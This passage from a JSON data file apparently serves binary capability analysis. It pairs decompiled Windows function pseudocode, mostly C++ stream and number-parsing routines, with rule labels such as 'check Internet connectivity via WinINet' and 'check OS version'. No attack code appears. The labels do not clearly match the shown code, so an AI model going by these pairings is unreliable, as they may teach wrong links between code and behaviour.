}\n            else {\n                iVar11 = *(iVar14 + -8);\n            }\n            if (0 < iVar11) goto code_r0x00014004ffbc;\n        }\n        *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = 0x65;\n        iVar14 = *in_stack_00000038;\n        *(iVar14 + -8) = 0;\n        *(iVar14 + -0x18) = uVar13;\n        *(iVar14 + 1 + iVar1) = 0;\n        if (uStack104[2] < uStack104[3]) {\n            uStack104[2] = uStack104[2] + 1;\n        }\n        else {\n            (**(*uStack104 + 0x50))();\n        }\n        uStack96 = 0xffffffff;\n        cVar8 = fcn.140029dd0(&uStack104, &piStack120);\n        if (cVar8 != '\\0') goto code_r0x0001400505ef;\n        uVar10 = uStack96;\n        if ((uStack104 != NULL) && (uStack96 == 0xffffffff)) {\n            if (uStack104[2] < uStack104[3]) {\n                uVar10 = *uStack104[2];\n            }\n            else {\n                uVar10 = (**(*uStack104 + 0x48))();\n                if (uVar10 == 0xffffffff) {\n                    uStack104 = NULL;\n                }\n            }\n        }\n        cVar8 = *(iVar12 + 0x6f);\n        uVar7 = *(iVar12 + 0x20);\n        cVar9 = uVar10;\n        uStack145 = uVar17;\n        if (cVar8 == cVar9) {\n            if (uVar7 != 0) goto code_r0x000140050260;\n            uVar13 = 0x2b;\n            cVar8 = *(iVar12 + 0x48);\n        }\n        else {\n            if (*(iVar12 + 0x6e) != cVar9) goto code_r0x00014004fcf8;\n            if (uVar7 != 0) {\ncode_r0x000140050260:\n                uVar7 = uVar17;\n                if ((*(iVar12 + 0x49) == cVar9) || (*(iVar12 + 0x48) == cVar9)) goto code_r0x00014004fcf8;\n                uVar13 = (cVar8 != cVar9) + 0x2b + (cVar8 != cVar9);\n                break;\n            }\n            uVar13 = 0x2d;\n            cVar8 = *(iVar12 + 0x48);\n        }\n    } while (cVar9 == cVar8);\n    fcn.14007da40(in_stack_00000038, uVar13);\ncode_r0x00014004fd9d:\n    piVar4 = uStack104;\n    if (uStack104[2] < uStack104[3]) {\n        uVar13 = uStack104[2] + 1;\n        uStack96 = 0xffffffff;\n        bVar21 = false;\n        uStack104[2] = uVar13;\n        if (uVar13 < uStack104[3]) goto code_r0x00014004fdce;\n    }\n    else {\n        (**(*uStack104 + 0x50))(uStack104);\n        uStack96 = 0xffffffff;\n        bVar21 = false;\n        if (piVar4[2] < piVar4[3]) goto code_r0x00014004fdce;\n    }\n    uStack96 = 0xffffffff;\n    iVar11 = (**(*piVar4 + 0x48))(piVar4);\n    if (iVar11 == -1) {\n        uStack104 = NULL;\n    }\n    bVar21 = iVar11 == -1;\ncode_r0x00014004fdce:\n    bVar20 = iStack112 == -1;\n    if (((piStack120 != NULL) && (bVar20)) && (bVar20 = false,  piStack120[3] <= piStack120[2])) {\n        iVar11 = (**(*piStack120 + 0x48))();\n        bVar20 = iVar11 == -1;\n        if (bVar20) {\n            piStack120 = NULL;\n        }\n    }\n    if (bVar21 == bVar20) goto code_r0x00014004fdf6;\n    if (uStack104 == NULL) {\n        uVar10 = 0xffffffff;\n    }\n    else if (uStack104[2] < uStack104[3]) {\n        uVar10 = *uStack104[2];\n    }\n    else {\n        uVar10 = (**(*uStack104 + 0x48))();\n        if (uVar10 == 0xffffffff) {\n            uStack104 = NULL;\n        }\n    }\n    uVar7 = *(iVar12 + 0x20);\n    goto code_r0x00014004fcf8;\ncode_r0x00014004fc21:\n    uVar5 = *uStack104[2];\n    uVar10 = uVar5;\n    goto joined_r0x00014004fb50;\ncode_r0x0001400505ef:\n    iVar14 = aiStack80[0];\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014004fe4c;\n    goto code_r0x00014004fe2a;\ncode_r0x0001400503e1:\n    uVar17 = 1;\n    uVar19 = 1;\ncode_r0x00014004fb00:\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar12 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    piVar3 = *0x14010fc90;\n    uVar5 = *(iVar12 + 0x88);\n    if (uVar5 == 0) {\n        if (uVar19 == 0) {\n            uStack145 = 0;\ncode_r0x00014004fb4b:\n            uVar5 = uVar10;\njoined_r0x00014004fb50:\n            if (9 < uVar5 - 0x30) {\n                uVar7 = uVar5;\n                if (*(iVar12 + 0x48) == uVar5) goto code_r0x00014005016f;\n                goto code_r0x00014004fc40;\n            }\n            iVar14 = *in_stack_00000038;\n            iVar1 = *(iVar14 + -0x18);\n            uVar13 = iVar1 + 1;\n            if (uVar13 <= *(iVar14 + -0x10)) {\n                if (*piVar3 == 0) {\n                    iVar11 = *(iVar14 + -8);\n                }\n                else {\n                    iVar11 = *(iVar14 + -8);\n                }\n                if (iVar11 < 1) goto code_r0x00014004fb8c;\n            }\n            fcn.14007d790(in_stack_00000038, uVar13);\ncode_r0x00014004fb8c:\n            *(*in_stack_00000038 + *(*in_stack_00000038 + -0x18)) = uVar10;\n            iVar14 = *in_stack_00000038;\n            *(iVar14 + -8) = 0;\n            *(iVar14 + -0x18) = uVar13;\n            *(iVar14 + 1 + iVar1) = 0;\n            uVar17 = 1;\ncode_r0x00014004fbb1:\n            piVar4 = uStack104;\n            if (uStack104[2] < uStack104[3]) {\n                uVar13 = uStack104[2] + 1;\n                uStack96 = 0xffffffff;\n                bVar21 = false;\n                uStack104[2] = uVar13;\n                if (uStack104[3] <= uVar13) {\ncode_r0x000140050120:\n                    uStack96 = 0xffffffff;\n                    iVar11 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar11 == -1) {\n                        uStack104 = NULL;\n                    }\n                    bVar21 = iVar11 == -1;\n                }\n            }\n            else {\n                (**(*uStack104 + 0x50))(uStack104);\n                uStack96 = 0xffffffff;\n                bVar21 = false;\n                if (piVar4[3] <= piVar4[2]) goto code_r0x000140050120;\n            }\n            bVar20 = iStack112 == -1;\n            if (((piStack120 != NULL) && (bVar20)) && (bVar20 = false,  piStack120[3] <= piStack120[2])) {\n                iVar11 = (**(*piStack120 + 0x48))();\n                bVar20 = iVar11 == -1;\n                if (bVar20) {\n                    piStack120 = NULL;\n                }\n            }\n            if (bVar20 == bVar21) goto code_r0x00014004fdf6;\n            if (uStack104 != NULL) {\n                if (uStack104[2] < uStack104[3]) goto code_r0x00014004fc21;\n                uVar10 = (**(*uStack104 + 0x48))();\n                if (uVar10 != 0xffffffff) goto code_r0x00014004fb4b;\n                uStack104 = NULL;\n            }\n            uVar5 = 0xff;\n            uVar7 = 0xff;\n            if (*(iVar12 + 0x48) == -1) {\ncode_r0x00014005016f:\n                uVar5 = uVar7;\n                if ((uStack145 | uVar19) != 0) goto code_r0x00014004fc40;\n                uVar19 = 1;\n                fcn.14007da40(in_stack_00000038, 0x2e);\n                uStack145 = 0;\n            }\n            else {\ncode_r0x00014004fc40:\n                if (((*(iVar12 + 0x80) != uVar5) && (*(iVar12 + 0x86) != uVar5)) ||\n                   (uVar17 = uVar17 & (uStack145 ^ 1),  uVar17 == 0)) goto code_r0x00014004fdf6;\n                fcn.14007da40(in_stack_00000038, 0x65);\n                fcn.14009b630(uStack104);\n                uStack96 = 0xffffffff;\n                cVar6 = fcn.140029dd0(&uStack104, &piStack120);\n                if (cVar6 != '\\0') goto code_r0x0001400505ef;\n                uVar10 = fcn.140029e90(&uStack104);\n                uStack145 = uVar17;\n                if (*(iVar12 + 0x6f) == uVar10) {\n                    arg2 = 0x2b;\n                }\n                else {\n                    arg2 = 0x2d;\n                    if (uVar10 != *(iVar12 + 0x6e)) goto code_r0x00014004fb4b;\n                }\n                fcn.14007da40(in_stack_00000038, arg2);\n            }\n            goto code_r0x00014004fbb1;\n        }\ncode_r0x000140050635:\n        iVar14 = aiStack80[0];\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014004fe4c;\ncode_r0x00014004fe14:\n        fcn.14007da40(aiStack80, iVar18);\n    }\n    else {\n        if (uVar19 != 0) goto code_r0x000140050635;\n        uStack145 = 0;\n        uVar7 = *(iVar12 + 0x20);\ncode_r0x00014004fcf8:\n        cVar6 = iVar18;\n        if ((uVar7 == 0) || (*(iVar12 + 0x49) != uVar10)) goto code_r0x00014004fd06;\n        uVar19 = uVar19 | uStack145;\n        if (uVar19 != 0) goto code_r0x0001400505ef;\n        if (iVar18 != 0) {\n            fcn.14007da40(aiStack80, cVar6);\n            uStack145 = 0;\n            iVar18 = 0;\n            goto code_r0x00014004fd9d;\n        }\n        fcn.14007d8a0(in_stack_00000038, 0, *(*in_stack_00000038 + -0x18), 0);\n        uStack145 = 0;\ncode_r0x00014004fdf6:\n        iVar14 = aiStack80[0];\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014004fe4c;\n        if ((uVar19 == 0) && (uStack145 == 0)) goto code_r0x00014004fe14;\n    }\ncode_r0x00014004fe2a:\n    iVar14 = aiStack80[0];\n    cVar6 = fcn.1400b76a0(*(iVar12 + 0x10), *(iVar12 + 0x18), aiStack80);\n    if (cVar6 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\ncode_r0x00014004fe4c:\n    *arg1 = uStack104;\n    arg1[1] = uStack104._4_4_;\n    arg1[2] = uStack96;\n    arg1[3] = uStack92;\n    fcn.14007bf20(iVar14 + -0x18);\n    return arg1;\n}\n",
        "token_count": 5839
    },
    "14005729": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140057290(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    char cVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint16_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    int64_t iVar14;\n    int16_t *piVar15;\n    int16_t *piVar16;\n    uint16_t *puVar17;\n    int64_t iVar18;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    int32_t iVar21;\n    uint8_t uVar22;\n    uint32_t uVar23;\n    bool bVar24;\n    bool bVar25;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    int64_t iStack152;\n    uint32_t uStack136;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar14 = fcn.140026f80(in_stack_00000028 + 0xd0);\n    uVar23 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar23 == 0x40) {\n        uVar20 = 8;\ncode_r0x0001400572f8:\n        uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar7 == 0) {\ncode_r0x000140057317:\n            uVar11 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar8 = *(iVar14 + 0x20);\n            if ((*(iVar14 + 0x94) == uVar11) || (bVar25 = false,  *(iVar14 + 0x96) == uVar11)) {\n                bVar25 = *(iVar14 + 0x94) == uVar11;\n                if (cVar8 != '\\0') {\n                    if ((*(iVar14 + 0x4a) != uVar11) && (*(iVar14 + 0x48) != uVar11)) goto code_r0x00014005762a;\n                    goto code_r0x000140057356;\n                }\n                if (*(iVar14 + 0x48) == uVar11) goto code_r0x000140057356;\ncode_r0x00014005762a:\n                fcn.14009c0a0(piStack104);\n                uStack96 = 0xffff;\n                uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n                if (uVar7 == 0) {\n                    uVar11 = fcn.140029f90(&piStack104);\n                    cVar8 = *(iVar14 + 0x20);\n                    goto code_r0x000140057356;\n                }\n                iVar21 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x000140057356:\n                iVar21 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar8 == '\\0' || (*(iVar14 + 0x4a) != uVar11)) &&\n                       (*(iVar14 + 0x48) != uVar11))) {\n                    if (*(iVar14 + 0x9c) == uVar11) {\n                        bVar3 = bVar3 ^ 1U | uVar20 == 10;\n                        if (!bVar3) goto code_r0x000140057389;\n                        bVar24 = uVar20 == 8;\n                        if (bVar24 || uVar23 == 0) {\n                            iVar21 = 0;\n                            uVar20 = 8;\n                            bVar3 = bVar24 || uVar23 == 0;\n                        }\n                        else {\n                            iVar21 = iVar21 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140057389:\n                        if ((*(iVar14 + 0x98) != uVar11) && (*(iVar14 + 0x9a) != uVar11)) {\n                            uVar7 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140057432;\n                        }\n                        uVar7 = uVar20 == 0x10 || uVar23 == 0;\n                        if (uVar20 != 0x10 && uVar23 != 0) {\n                            bVar3 = true;\n                            goto code_r0x00014005743c;\n                        }\n                        iVar21 = 0;\n                        uVar20 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar15 = piStack104[2] + 1;\n                        piStack104[2] = piVar15;\n                        if (piVar15 < piStack104[3]) goto code_r0x0001400573f2;\ncode_r0x0001400578a0:\n                        uStack96 = 0xffff;\n                        iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar15 = piVar4[2];\n                        if (piVar4[3] <= piVar15) goto code_r0x0001400578a0;\ncode_r0x0001400573f2:\n                        uStack96 = 0xffff;\n                        iVar10 = *piVar15;\n                    }\n                    if (iVar10 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar24 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar24)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar24 = iVar9 == -1;\n                    }\n                    if ((iVar10 == -1) == bVar24) {\n                        uVar7 = 1;\n                        goto code_r0x000140057432;\n                    }\n                    uVar11 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar11 = *piStack104[2];\n                        }\n                        else {\n                            uVar11 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar11 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar8 = *(iVar14 + 0x20);\n                }\n                uVar7 = 0;\n            }\ncode_r0x000140057432:\n            if (uVar20 == 0x10) goto code_r0x000140057699;\n        }\n        else {\n            bVar25 = false;\n            uVar11 = 0;\n            iVar21 = 0;\n            bVar3 = false;\n        }\ncode_r0x00014005743c:\n        iStack152 = uVar20;\n        uStack136 = uVar20;\n    }\n    else {\n        uVar20 = 10;\n        if (uVar23 != 8) goto code_r0x0001400572f8;\n        uVar20 = 0x10;\n        uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar7 == 0) goto code_r0x000140057317;\n        bVar25 = false;\n        uVar11 = 0;\n        iVar21 = 0;\n        bVar3 = false;\ncode_r0x000140057699:\n        uStack136 = 0x10;\n        uVar20 = 0x16;\n        iStack152 = 0x16;\n    }\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar14 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar23 = 0xffffffff / uStack136;\n    uVar2 = *(iVar14 + 200);\n    uVar5 = uVar7;\n    if (uVar2 == 0) {\n        uVar22 = 0;\n        if (uVar7 == 0) {\n            uVar13 = 0;\ncode_r0x0001400574ac:\n            uVar12 = uVar11;\n            if (uVar20 < 0xb) {\n                if ((uVar11 < 0x30) || (iStack152 + 0x30U <= uVar11)) goto code_r0x000140057778;\n            }\n            else if (9 < uVar11 - 0x30) {\n                if (5 < uVar11 - 0x61) goto code_r0x000140057924;\n                uVar12 = uVar12 - 0x57;\n                goto code_r0x0001400574d1;\n            }\n            uVar12 = uVar12 - 0x30;\ncode_r0x0001400574d1:\n            do {\n                piVar4 = piStack104;\n                if (uVar23 < uVar13) {\n                    uVar22 = 1;\n                }\n                else {\n                    uVar19 = uVar13 * uStack136;\n                    uVar13 = uVar12 + uVar19;\n                    iVar21 = iVar21 + 1;\n                    uVar22 = uVar22 | CARRY4(uVar12, uVar19);\n                }\n                piVar15 = piStack104[3];\n                if (piStack104[2] < piVar15) {\n                    piVar16 = piStack104[2] + 1;\n                    piStack104[2] = piVar16;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar16 = piVar4[2];\n                    piVar15 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar16 < piVar15) {\n                    iVar10 = *piVar16;\n                }\n                else {\n                    iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar10 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar24 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar24)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar24 = iVar9 == -1;\n                }\n                if ((iVar10 == -1) == bVar24) {\n                    uVar2 = 1;\n                    goto code_r0x000140057565;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar11 = *piStack104[2];\n                    }\n                    else {\n                        uVar11 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar11 != 0xffff) goto code_r0x0001400574ac;\n                    piStack104 = NULL;\n                }\n                if (uVar20 < 0xb) goto code_r0x000140057778;\n                uVar12 = 0xffff;\n                uVar11 = 0xffff;\ncode_r0x000140057924:\n                if (5 < uVar11 - 0x41) goto code_r0x000140057778;\n                uVar12 = uVar12 - 0x37;\n            } while( true );\n        }\n        uVar13 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\n    else {\n        if (uVar7 == 0) {\n            uVar22 = 0;\n            uVar13 = 0;\ncode_r0x000140057960:\n            if ((*(iVar14 + 0x20) == 0) || (*(iVar14 + 0x4a) != uVar11)) {\n                puVar17 = iVar14 + 0x9c;\n                iVar18 = iStack152;\n                if (*(iVar14 + 0x48) == uVar11) goto code_r0x000140057778;\n                while (uVar11 != *puVar17) {\n                    iVar18 = iVar18 + -1;\n                    puVar17 = puVar17 + 1;\n                    if (iVar18 == 0) goto code_r0x000140057778;\n                }\n                uVar20 = puVar17 - (iVar14 + 0x9c) >> 1;\n                if (0xf < uVar20) {\n                    uVar20 = uVar20 - 6;\n                }\n                uVar6 = uVar2;\n                if (uVar13 <= uVar23) {\n                    uVar12 = uVar13 * uStack136;\n                    uVar13 = uVar20 + uVar12;\n                    iVar21 = iVar21 + 1;\n                    uVar6 = uVar22 | CARRY4(uVar20, uVar12);\n                }\n            }\n            else {\n                if (iVar21 == 0) {\n                    uVar5 = *(iVar14 + 0x20);\n                    uVar2 = 0;\n                    goto code_r0x000140057565;\n                }\n                fcn.14007da40(aiStack80, iVar21);\n                iVar21 = 0;\n                uVar6 = uVar22;\n            }\n            uVar22 = uVar6;\n            piVar4 = piStack104;\n            piVar15 = piStack104[3];\n            if (piStack104[2] < piVar15) {\n                piVar16 = piStack104[2] + 1;\n                piStack104[2] = piVar16;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar16 = piVar4[2];\n                piVar15 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar16 < piVar15) {\n                iVar10 = *piVar16;\n            }\n            else {\n                iVar10 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar10 == -1) {\n                piStack104 = NULL;\n            }\n            bVar24 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar24)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar24 = iVar9 == -1;\n            }\n            if ((iVar10 == -1) == bVar24) goto code_r0x000140057565;\n            if (piStack104 == NULL) {\n                uVar11 = 0xffff;\n            }\n            else {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            goto code_r0x000140057960;\n        }\n        uVar13 = 0;\n        uVar22 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\ncode_r0x000140057565:\n    uVar7 = uVar5;\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014005778d;\ncode_r0x000140057578:\n    if ((iVar21 != 0) || (bVar3)) {\ncode_r0x0001400577d1:\n        if (uVar7 == 0) {\n            if (uVar22 == 0) {\n                if (bVar25) {\n                    uVar13 = -uVar13;\n                }\n                *in_stack_00000038 = uVar13;\n            }\n            else {\n                *in_stack_00000038 = 0xffffffff;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x0001400575a7;\n        }\n    }\n    goto code_r0x00014005758b;\ncode_r0x000140057778:\n    uVar2 = 0;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140057578;\ncode_r0x00014005778d:\n    fcn.14007da40(aiStack80, iVar21);\n    cVar8 = fcn.1400b76a0(*(iVar14 + 0x10), *(iVar14 + 0x18), aiStack80);\n    if (cVar8 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar21 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x0001400577d1;\ncode_r0x00014005758b:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x0001400575a7:\n    if (uVar2 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar21 = **0x14010fc90;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar21 == 0) {\n        iVar21 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar21 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar21 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar21 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4514
    },
    "140057d3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140057d30(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    char cVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint16_t uVar11;\n    int32_t iVar12;\n    int64_t iVar13;\n    int16_t *piVar14;\n    int16_t *piVar15;\n    uint16_t *puVar16;\n    int64_t iVar17;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    int32_t iVar21;\n    uint8_t uVar22;\n    uint32_t uVar23;\n    bool bVar24;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    int64_t iStack160;\n    uint32_t uStack148;\n    uint32_t uStack140;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar13 = fcn.140026f80(in_stack_00000028 + 0xd0);\n    uVar23 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar23 == 0x40) {\n        uVar20 = 8;\ncode_r0x000140057d98:\n        uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar7 == 0) {\ncode_r0x000140057db7:\n            uVar11 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar8 = *(iVar13 + 0x20);\n            if ((*(iVar13 + 0x94) == uVar11) || (uStack140 = 0,  *(iVar13 + 0x96) == uVar11)) {\n                uStack140 = *(iVar13 + 0x94) == uVar11;\n                if (cVar8 != '\\0') {\n                    if ((*(iVar13 + 0x4a) != uVar11) && (*(iVar13 + 0x48) != uVar11)) goto code_r0x0001400580da;\n                    goto code_r0x000140057df6;\n                }\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x000140057df6;\ncode_r0x0001400580da:\n                fcn.14009c0a0(piStack104);\n                uStack96 = 0xffff;\n                uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n                if (uVar7 == 0) {\n                    uVar11 = fcn.140029f90(&piStack104);\n                    cVar8 = *(iVar13 + 0x20);\n                    goto code_r0x000140057df6;\n                }\n                iVar21 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x000140057df6:\n                iVar21 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar8 == '\\0' || (*(iVar13 + 0x4a) != uVar11)) &&\n                       (*(iVar13 + 0x48) != uVar11))) {\n                    if (*(iVar13 + 0x9c) == uVar11) {\n                        bVar3 = bVar3 ^ 1U | uVar20 == 10;\n                        if (!bVar3) goto code_r0x000140057e29;\n                        bVar24 = uVar20 == 8;\n                        if (bVar24 || uVar23 == 0) {\n                            iVar21 = 0;\n                            uVar20 = 8;\n                            bVar3 = bVar24 || uVar23 == 0;\n                        }\n                        else {\n                            iVar21 = iVar21 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140057e29:\n                        if ((*(iVar13 + 0x98) != uVar11) && (*(iVar13 + 0x9a) != uVar11)) {\n                            uVar7 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140057ed2;\n                        }\n                        uVar7 = uVar20 == 0x10 || uVar23 == 0;\n                        if (uVar20 != 0x10 && uVar23 != 0) {\n                            bVar3 = true;\n                            goto code_r0x000140057edc;\n                        }\n                        iVar21 = 0;\n                        uVar20 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar14 = piStack104[2] + 1;\n                        piStack104[2] = piVar14;\n                        if (piVar14 < piStack104[3]) goto code_r0x000140057e92;\ncode_r0x000140058350:\n                        uStack96 = 0xffff;\n                        iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar14 = piVar4[2];\n                        if (piVar4[3] <= piVar14) goto code_r0x000140058350;\ncode_r0x000140057e92:\n                        uStack96 = 0xffff;\n                        iVar10 = *piVar14;\n                    }\n                    if (iVar10 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar24 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar24)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar24 = iVar9 == -1;\n                    }\n                    if ((iVar10 == -1) == bVar24) {\n                        uVar7 = 1;\n                        goto code_r0x000140057ed2;\n                    }\n                    uVar11 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar11 = *piStack104[2];\n                        }\n                        else {\n                            uVar11 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar11 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar8 = *(iVar13 + 0x20);\n                }\n                uVar7 = 0;\n            }\ncode_r0x000140057ed2:\n            if (uVar20 == 0x10) goto code_r0x000140058149;\n        }\n        else {\n            uStack140 = 0;\n            uVar11 = 0;\n            iVar21 = 0;\n            bVar3 = false;\n        }\ncode_r0x000140057edc:\n        iStack160 = uVar20;\n        uStack148 = uVar20;\n    }\n    else {\n        uVar20 = 10;\n        if (uVar23 != 8) goto code_r0x000140057d98;\n        uVar20 = 0x10;\n        uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n        if 